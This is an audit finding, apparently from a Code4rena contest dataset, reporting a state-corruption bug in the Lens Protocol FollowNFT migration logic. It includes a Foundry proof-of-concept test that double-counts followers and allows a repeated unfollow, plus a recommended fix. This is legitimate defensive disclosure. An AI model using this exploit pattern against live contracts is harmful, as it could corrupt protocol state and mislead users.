# [M] `tryMigrate`

## Summary
Severity: Medium
Contest weight: 0.8268
Dataset id: 18955
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
In `FollowNFT.sol`, the `tryMigrate()` function is used to migrate users who were following before the V2 upgrade. It does so by updating `_followTokenIdByFollowerProfileId` and `_followDataByFollowTokenId`, which are state variables introduced in the V2 upgrade:
```solidity
_followTokenIdByFollowerProfileId[followerProfileId] = followTokenId;

uint48 mintTimestamp = uint48(StorageLib.getTokenData(followTokenId).mintTimestamp);

_followDataByFollowTokenId[followTokenId].followerProfileId = uint160(followerProfileId);
_followDataByFollowTokenId[followTokenId].originalFollowTimestamp = mintTimestamp;
_followDataByFollowTokenId[followTokenId].followTimestamp = mintTimestamp;
```

Since `_followTokenIdByFollowerProfileId` is a new state variable, it will be set to 0 for users who were following before the V2 upgrade. This allows old followers to call `follow()` to follow the profile again before `tryMigrate()` is called:
```solidity
function follow(
    uint256 followerProfileId,
    address transactionExecutor,
    uint256 followTokenId
) external override onlyHub returns (uint256) {
    if (_followTokenIdByFollowerProfileId[followerProfileId] != 0) {
        revert AlreadyFollowing();
    }
```

Even if `tryMigrate()` is called by the protocol team immediately after the V2 upgrade, a malicious user can still call `follow()` before `tryMigrate()` by:

  * Front-running the migration transaction.
  * Holding his profile and follow NFT in different addresses, which causes `tryMigrate()` to return [here](https://github.com/code-423n4/2023-07-lens/blob/main/contracts/FollowNFT.sol#L501-L504).

As a profile should not be able to follow the same profile twice, `tryMigrate()` should then revert for old followers who have called `follow()`. However, this isn’t enforced by `tryMigrate()` as there is no check that `_followDataByFollowTokenId[followerProfileId]` is 0.

As a result, if `tryMigrate()` is called after `follow()`, `_followerCount` will be incremented twice for a single profile:
```solidity
unchecked {
    ++_followerCount;
}

_followTokenIdByFollowerProfileId[followerProfileId] = followTokenId;
```

Additionally, even though `_followTokenIdByFollowerProfileId` points to a new `followTokenId`, `_followDataByFollowTokenId` will not be cleared for the previous follow token ID.

As the state of the `FollowNFT` contract is now corrupt, followers can perform functions that they normally should not be able to, such as unfollowing when their profile is not a follower (`isFollowing()` returns `false`).

## Proof of Concept
The Foundry test below demonstrates that `tryMigrate()` can be called although the user is already following, and how `followerCount` and `_followDataByFollowTokenId` will be corrupted as a result. It can be run with the following command:
    
    forge test --match-test testCanMigrateWhileFollowing -vvv
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import 'test/base/BaseTest.t.sol';

contract FollowMigration_POC is BaseTest {
    address target = address(0x1337);
    address ALICE;

    uint256 targetProfileId;
    uint256 aliceProfileId;

    uint256 oldFollowTokenId;

    function setUp() public override {
        super.setUp();

        // Setup addresses for Alice
        ALICE = makeAddr("Alice");

        // Create profile for target and Alice 
        targetProfileId = _createProfile(target);
        aliceProfileId = _createProfile(ALICE);

        // Add simulateV1Follow() helper function to FollowNFT implementation
        FollowNFTHelper implementation = new FollowNFTHelper(address(hub));  
        vm.etch(hub.getFollowNFTImpl(), address(implementation).code);
        
        // Follow and unfollow to deploy target's FollowNFT contract
        vm.startPrank(defaultAccount.owner);
        hub.follow(
            defaultAccount.profileId,
            _toUint256Array(targetProfileId),
            _toUint256Array(0),
            _toBytesArray('')
        );
        hub.unfollow(defaultAccount.profileId, _toUint256Array(targetProfileId));
        vm.stopPrank();

        // Get FollowNFT contract
        address followNFTAddress = hub.getProfile(targetProfileId).followNFT; 
        followNFT = FollowNFT(followNFTAddress);

        // Alice follows target before the V2 upgrade
        oldFollowTokenId = FollowNFTHelper(followNFTAddress).simulateV1Follow(ALICE);
    }

    function testCanMigrateWhileFollowing() public {
        // After the V2 upgrade, Alice calls follow() instead of migrating her follow
        vm.startPrank(ALICE);
        uint256 followTokenId = hub.follow(
            aliceProfileId,
            _toUint256Array(targetProfileId),
            _toUint256Array(0),
            _toBytesArray('')
        )[0];

        // Alice migrates her V1 follow even though her profile is already following
        hub.batchMigrateFollows(
            _toUint256Array(aliceProfileId),
            _toUint256Array(targetProfileId),
            _toUint256Array(oldFollowTokenId)
        );

        // followTokenId's followerProfileId points to Alice's profile
        assertEq(followNFT.getFollowerProfileId(followTokenId), aliceProfileId);

        // However, Alice's _followTokenIdByFollowerProfileId points to oldFollowTokenId
        assertEq(followNFT.getFollowTokenId(aliceProfileId), oldFollowTokenId);

        // Follower count is 2 although Alice is the only follower
        assertEq(followNFT.getFollowerCount(), 2);

        // Wrap both follow tokens
        vm.startPrank(ALICE);
        followNFT.wrap(followTokenId);
        followNFT.wrap(oldFollowTokenId);

        // Alice unfollows using removeFollower()
        vm.expectEmit();
        emit Events.Unfollowed(aliceProfileId, targetProfileId, 1);
        followNFT.removeFollower(followTokenId);

        // Alice is no longer following
        assertFalse(followNFT.isFollowing(aliceProfileId));

        // However, she is still able to unfollow for a second time
        vm.expectEmit();
        emit Events.Unfollowed(aliceProfileId, targetProfileId, 1);
        followNFT.removeFollower(oldFollowTokenId);
    }
}

contract FollowNFTHelper is FollowNFT {
    constructor(address hub) FollowNFT(hub) {}
    
    /*
    Helper function to mimic a V1 follow, which does the following:
    - Increment _tokenIdCounter
    - Mint a followNFT
    */ 
    function simulateV1Follow(address follower) external returns (uint256 followTokenId) {
        followTokenId = ++_lastFollowTokenId;
        _mint(follower, followTokenId);
    }
}
```

## Recommendation
```solidity
function tryMigrate(
    uint256 followerProfileId,
    address followerProfileOwner,
    uint256 idOfProfileFollowed,
    uint256 followTokenId
) external onlyHub returns (uint48) {
+   if (_followTokenIdByFollowerProfileId[followerProfileId] != 0) {
+       return 0;
+   }
+
    // Migrated FollowNFTs should have `originalFollowTimestamp` set
    if (_followDataByFollowTokenId[followTokenId].originalFollowTimestamp != 0) {
        return 0; // Already migrated
    }
```
